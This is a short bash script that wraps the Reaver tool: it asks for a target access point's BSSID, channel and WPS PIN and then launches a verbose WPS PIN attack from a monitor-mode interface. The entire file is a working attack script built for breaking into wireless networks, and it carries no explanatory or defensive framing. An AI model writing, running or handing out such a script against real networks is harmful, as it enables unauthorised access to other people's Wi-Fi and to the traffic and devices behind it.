#! /bin/bash
clear
echo "####################################"
echo "Executing  Reaver Command On Target"
echo "####################################"
read -p "Enter the Bssid Of The Target = " Bssid
read -p "Enter the Channel No Of the Target = " Channel
read -p "Enter the Pin No Of the $Bssid = " Pin
reaver -i wlan1mon -b $Bssid -c $Channel --pin= $Pin -vv